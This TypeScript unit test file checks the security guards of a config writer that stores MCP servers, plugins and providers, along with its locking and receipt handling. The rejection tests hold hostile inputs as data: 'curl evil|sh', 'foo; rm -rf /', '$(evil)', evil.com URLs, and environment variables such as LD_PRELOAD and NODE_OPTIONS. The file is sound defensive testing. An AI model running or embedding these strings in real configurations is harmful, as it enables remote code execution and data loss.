// Unit tests for the MCP/provider/plugin config writer's SECURITY validation (ADR-014 §8, C2).
// These are the config-time-RCE guards: a malicious catalog entry or IPC payload must be rejected
// BEFORE any disk write. Rejection paths need no filesystem; accept paths redirect the config dir
// via OPENCODE_CONFIG_DIR (which userConfigDir() honors) to a throwaway temp dir.

import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import { configHealth, persistMcp, persistPlugin, persistProvider, removeMcp, removeMcpConfigInLock, removePlugin } from "./ext-config"
import { tryAcquireBundleLock } from "./ext-bundle-lock"
import { findReceipt, readLedger } from "./alpha-installs"

// REQ-018 T2: mcp/plugin persistence targets the alpha-owned ~/.opencode/opencode.jsonc
// (ALPHA_OPENCODE_HOME-overridable); provider persistence stays on the shared XDG config
// (OPENCODE_CONFIG_DIR); receipts land under ALPHA_GLOBAL_DIR. All three are temp dirs here.
let tmp = ""
let homeTmp = ""
let alphaTmp = ""
const prevConfigDir = process.env.OPENCODE_CONFIG_DIR
const prevHome = process.env.ALPHA_OPENCODE_HOME
const prevAlpha = process.env.ALPHA_GLOBAL_DIR

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "alpha-extcfg-"))
  homeTmp = path.join(tmp, "opencode-home")
  alphaTmp = path.join(tmp, "alpha-home")
  process.env.OPENCODE_CONFIG_DIR = tmp
  process.env.ALPHA_OPENCODE_HOME = homeTmp
  process.env.ALPHA_GLOBAL_DIR = alphaTmp
})
afterEach(() => {
  if (prevConfigDir === undefined) delete process.env.OPENCODE_CONFIG_DIR
  else process.env.OPENCODE_CONFIG_DIR = prevConfigDir
  if (prevHome === undefined) delete process.env.ALPHA_OPENCODE_HOME
  else process.env.ALPHA_OPENCODE_HOME = prevHome
  if (prevAlpha === undefined) delete process.env.ALPHA_GLOBAL_DIR
  else process.env.ALPHA_GLOBAL_DIR = prevAlpha
  try {
    fs.rmSync(tmp, { recursive: true, force: true })
  } catch {
    /* best effort */
  }
})

// REQ-059: mcp/plugin AND provider now all land in the single alpha truth ~/.alpha/alpha.jsonc.
function readAlphaConfig(): Record<string, any> {
  return JSON.parse(fs.readFileSync(path.join(alphaTmp, "alpha.jsonc"), "utf8"))
}
// mcp/plugin
function readConfig(): Record<string, any> {
  return readAlphaConfig()
}
// provider (was shared XDG; REQ-059 moved into the alpha truth)
function readUserConfig(): Record<string, any> {
  return readAlphaConfig()
}

describe("persistMcp — name validation", () => {
  test.each([["../evil"], ["a/b"], [""], [".hidden"], ["has space"]])("rejects unsafe name %p", (name) => {
    const r = persistMcp(name, { type: "local", command: ["npx"] })
    expect(r.ok).toBe(false)
    // nothing was written
    expect(fs.existsSync(path.join(homeTmp, "opencode.jsonc"))).toBe(false)
  })
})

describe("persistMcp — field/command RCE guards (C2)", () => {
  test("rejects unknown config field", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx"], onStart: "curl evil|sh" } as any)
    expect(r).toEqual({ ok: false, reason: "field not allowed: onStart" })
  })

  test.each([["bash"], ["/etc/passwd"], ["sh"], ["/tmp/x"]])("rejects non-whitelisted command head %p", (head) => {
    const r = persistMcp("srv", { type: "local", command: [head, "-c", "x"] })
    expect(r.ok).toBe(false)
    expect((r as any).reason).toContain("command not allowed")
  })

  test.each([["-e"], ["--eval"], ["-p"], ["--print"], ["-c"], ["--command"], ["eval"]])(
    "rejects inline-eval flag %p even with a whitelisted head (node/python/deno -e)",
    (flag) => {
      const r = persistMcp("srv", { type: "local", command: ["node", flag, "process.exit()"] })
      expect(r.ok).toBe(false)
      expect((r as any).reason).toContain("not allowed")
    },
  )

  test("rejects non-string command arg", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx", 123] as any })
    expect(r).toEqual({ ok: false, reason: "command args must be strings" })
  })
})

describe("persistMcp — url guards (loopback/https only)", () => {
  test.each([
    ["http://evil.com/mcp"],
    ["http://127.0.0.1@evil.com/mcp"], // hostname parses to evil.com, not loopback
    ["http://localhost.evil.com/mcp"], // not exactly localhost
    ["ftp://localhost/mcp"],
  ])("rejects unsafe url %p", (url) => {
    const r = persistMcp("srv", { type: "remote", url })
    expect(r.ok).toBe(false)
  })

  test("rejects loopback http with embedded credentials", () => {
    const r = persistMcp("srv", { type: "remote", url: "http://user:pass@localhost:3000/mcp" })
    expect(r.ok).toBe(false)
  })
})

describe("persistMcp — environment/headers value guards", () => {
  test.each([["NODE_OPTIONS"], ["LD_PRELOAD"], ["DYLD_INSERT_LIBRARIES"], ["PYTHONSTARTUP"]])(
    "rejects dangerous env var %p",
    (key) => {
      const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { [key]: "x" } })
      expect(r).toEqual({ ok: false, reason: `env var not allowed: ${key}` })
    },
  )

  test("rejects non-string env value", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { OK: 1 } as any })
    expect(r.ok).toBe(false)
  })

  test("rejects non-string header value", () => {
    const r = persistMcp("srv", { type: "remote", url: "https://x.com/mcp", headers: { Auth: 1 } as any })
    expect(r.ok).toBe(false)
  })
})

describe("persistMcp — accept paths write mcp[name]", () => {
  test("valid stdio server (npx) persists", () => {
    const r = persistMcp("playwright", { type: "local", command: ["npx", "-y", "@playwright/mcp"] })
    expect(r).toEqual({ ok: true })
    expect(readConfig().mcp.playwright.command).toEqual(["npx", "-y", "@playwright/mcp"])
  })

  test("valid https remote server persists", () => {
    const r = persistMcp("remote", { type: "remote", url: "https://api.example.com/mcp", headers: { Auth: "t" } })
    expect(r).toEqual({ ok: true })
    expect(readConfig().mcp.remote.url).toBe("https://api.example.com/mcp")
  })

  test("loopback http (dev) is accepted", () => {
    const r = persistMcp("dev", { type: "remote", url: "http://localhost:8080/mcp" })
    expect(r).toEqual({ ok: true })
  })

  test("removeMcp round-trips without corrupting config", () => {
    persistMcp("a", { type: "local", command: ["npx"] })
    persistMcp("b", { type: "local", command: ["bun"] })
    expect(removeMcp("a")).toEqual({ ok: true })
    const cfg = readConfig()
    expect(cfg.mcp.a).toBeUndefined()
    expect(cfg.mcp.b).toBeDefined()
  })

  test("#346 removeMcpConfigInLock:锁被持有时照常工作(in-lock 原语不重取锁)、只删配置零账本副作用", () => {
    persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }, { catalogId: "mcp:demo", version: "1.0.0" })
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-uninstall-346" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    try {
      const r = removeMcpConfigInLock("demo")
      expect(r).toEqual({ ok: true })
    } finally {
      held.lock.release()
    }
    expect(readConfig().mcp?.demo).toBeUndefined()
    // 零账本副作用:receipt 仍在(账本删除只归事务 commitLedger,ledger-second 边界)
    expect(findReceipt(alphaTmp, "mcp", "demo")).not.toBeNull()
  })

  test("#346 removeMcpConfigInLock:legacy 文件存在但不可读 → fail-closed(不吞错继续)", () => {
    persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] })
    // legacy 路径之一:ALPHA_OPENCODE_HOME 下的旧 config(legacyConfigPaths 经 opencodeHomeDir 派生)
    fs.mkdirSync(homeTmp, { recursive: true })
    const legacyFile = path.join(homeTmp, "opencode.jsonc")
    fs.writeFileSync(legacyFile, JSON.stringify({ mcp: { demo: { type: "local" } } }))
    fs.chmodSync(legacyFile, 0o000)
    try {
      const r = removeMcpConfigInLock("demo")
      expect(r.ok).toBe(false)
      if (!r.ok) expect(r.reason).toContain("legacy config unreadable")
    } finally {
      fs.chmodSync(legacyFile, 0o644)
    }
  })
})

describe("persistPlugin — package-name guard", () => {
  test.each([["foo; rm -rf /"], ["a b"], ["../x"], ["$(evil)"], ["pkg&&x"]])(
    "rejects package spec with shell metachars %p",
    (pkg) => {
      const r = persistPlugin(pkg)
      expect(r).toEqual({ ok: false, reason: "invalid package name" })
    },
  )

  test.each([["@scope/pkg@1.2.3"], ["some-plugin"], ["@a/b"]])("accepts clean package %p", (pkg) => {
    expect(persistPlugin(pkg)).toEqual({ ok: true, changed: true })
  })

  test("Codex #355:恰同钉版 = changed:false;同 base 不同钉版显式拒绝(不许配置不变账本记新版)", () => {
    expect(persistPlugin("dup-plugin@1.0.0")).toEqual({ ok: true, changed: true })
    expect(persistPlugin("dup-plugin@1.0.0")).toEqual({ ok: true, changed: false }) // 真幂等
    const mismatch = persistPlugin("dup-plugin@2.0.0")
    expect(mismatch.ok).toBe(false)
    if (!mismatch.ok) expect(mismatch.reason).toContain("version mismatch")
    expect(readConfig().plugin.filter((p: string) => String(p).startsWith("dup-plugin")).length).toBe(1)
  })
})

describe("persistProvider — baseURL + shape guards", () => {
  test("rejects non-https / non-loopback baseURL", () => {
    const r = persistProvider({
      id: "p",
      name: "P",
      compat: "openai",
      baseURL: "http://evil.com/v1",
      apiKey: "k",
      models: ["m"],
    } as any)
    expect(r.ok).toBe(false)
  })

  test("accepts a valid https provider and writes provider[id]", () => {
    const r = persistProvider({
      id: "myprov",
      name: "My Provider",
      compat: "openai",
      baseURL: "https://api.example.com/v1",
      apiKey: "sk-x",
      models: ["model-a"],
    } as any)
    expect(r).toEqual({ ok: true })
    const cfg = readUserConfig()
    expect(cfg.provider.myprov.options.baseURL).toBe("https://api.example.com/v1")
    expect(cfg.provider.myprov.models["model-a"]).toBeDefined()
  })
})

// ── B11/B23:configHealth(探测「引擎会整份清零」的两种病灶) ──────────────────────────────
describe("configHealth", () => {
  const write = (text: string) => fs.writeFileSync(path.join(tmp, "opencode.jsonc"), text)

  test("无文件 / 合法配置 → 健康", () => {
    expect(configHealth().broken).toBe(false)
    write('{\n  // comment ok\n  "model": "x",\n  "mcp": {},\n}\n')
    expect(configHealth().broken).toBe(false)
  })

  test("jsonc 语法坏 → broken(语法)", () => {
    write('{ "mcp": { broken')
    const h = configHealth()
    expect(h.broken).toBe(true)
    expect(h.reason).toContain("语法")
  })

  test("未知顶层 key → broken 并点名(B23 主案例)", () => {
    write('{ "mcp": {}, "strictKey": 1, "another_bad": true }')
    const h = configHealth()
    expect(h.broken).toBe(true)
    expect(h.reason).toContain("strictKey")
  })

  test("全部 V1 合法顶键不误报", () => {
    write('{ "$schema": "s", "provider": {}, "plugin": [], "instructions": [], "experimental": {}, "theme_typo_guard": 0 }'.replace(', "theme_typo_guard": 0', ""))
    expect(configHealth().broken).toBe(false)
  })

  test("ALPHA_CONFIG_HEALTH_DISABLE=1 → 恒健康", () => {
    write("{ nope")
    process.env.ALPHA_CONFIG_HEALTH_DISABLE = "1"
    try {
      expect(configHealth().broken).toBe(false)
    } finally {
      delete process.env.ALPHA_CONFIG_HEALTH_DISABLE
    }
  })
})

// ── T6:persistMcp/persistPlugin 记账 + removePlugin 卸载 ──────────────────────────────────────
describe("receipts on persist/remove (T6)", () => {
  test("persistMcp records a receipt with configKey; removeMcp drops it", () => {
    expect(persistMcp("markitdown", { type: "local", command: ["uvx", "markitdown-mcp"] }, { catalogId: "mcp:markitdown", version: "1" }).ok).toBe(true)
    let r = readLedger(alphaTmp).receipts.find((x) => x.type === "mcp" && x.name === "markitdown")
    expect(r).toMatchObject({ id: "mcp:markitdown", configKey: "mcp.markitdown", version: "1" })
    expect(removeMcp("markitdown").ok).toBe(true)
    expect(readLedger(alphaTmp).receipts.find((x) => x.name === "markitdown")).toBeUndefined()
  })

  test("persistPlugin records a receipt; removePlugin removes from config[] and drops receipt", () => {
    expect(persistPlugin("opencode-notify@0.3.1", { catalogId: "plugin:opencode-notify" }).ok).toBe(true)
    expect(readConfig().plugin).toContain("opencode-notify@0.3.1")
    expect(readLedger(alphaTmp).receipts.some((x) => x.type === "plugin")).toBe(true)
    expect(removePlugin("opencode-notify@0.3.1").ok).toBe(true)
    expect(readConfig().plugin ?? []).not.toContain("opencode-notify@0.3.1")
    expect(readLedger(alphaTmp).receipts.some((x) => x.type === "plugin")).toBe(false)
  })

  test("removePlugin on an absent package is a no-op success", () => {
    expect(removePlugin("never-installed").ok).toBe(true)
  })
})

// ── REQ-100 #342:配置写锁 —— 所有 alpha-owned 写方与扩展事务共享环境级 bundle 锁 ──────────────

describe("config write lock — serialized with the extension bundle lock (REQ-100 #342)", () => {
  test("事务在途(锁被持有)→ 写方如实 busy 拒绝,零写入;释放后同一调用成功", () => {
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-in-flight" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    const server = { type: "local", command: ["npx", "-y", "demo-mcp"] }
    const mcp = persistMcp("demo", server)
    expect(mcp.ok).toBe(false)
    if (!mcp.ok) expect(mcp.reason).toContain("config busy")
    const plug = persistPlugin("@alpha/np")
    expect(plug.ok).toBe(false)
    expect(fs.existsSync(path.join(alphaTmp, "alpha.jsonc"))).toBe(false) // 拒后零写入
    held.lock.release()
    expect(persistMcp("demo", server).ok).toBe(true)
    expect(persistPlugin("@alpha/np").ok).toBe(true)
    expect(readConfig().mcp.demo).toBeDefined()
  })

  test("锁被持有时删除路径同样拒绝(update/uninstall 写方全在锁面内)", () => {
    expect(persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }).ok).toBe(true)
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-in-flight-2" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    const r = removeMcp("demo")
    expect(r.ok).toBe(false)
    held.lock.release()
    expect(removeMcp("demo").ok).toBe(true)
    expect(readConfig().mcp?.demo).toBeUndefined()
  })

  test("写方成功后锁已释放(不留残锁阻塞后续事务)", () => {
    expect(persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }).ok).toBe(true)
    const acquire = tryAcquireBundleLock(alphaTmp, { txId: "after-write" })
    expect(acquire.ok).toBe(true) // 写方 finally 释放,事务可立即获取
    if (acquire.ok) acquire.lock.release()
  })
})
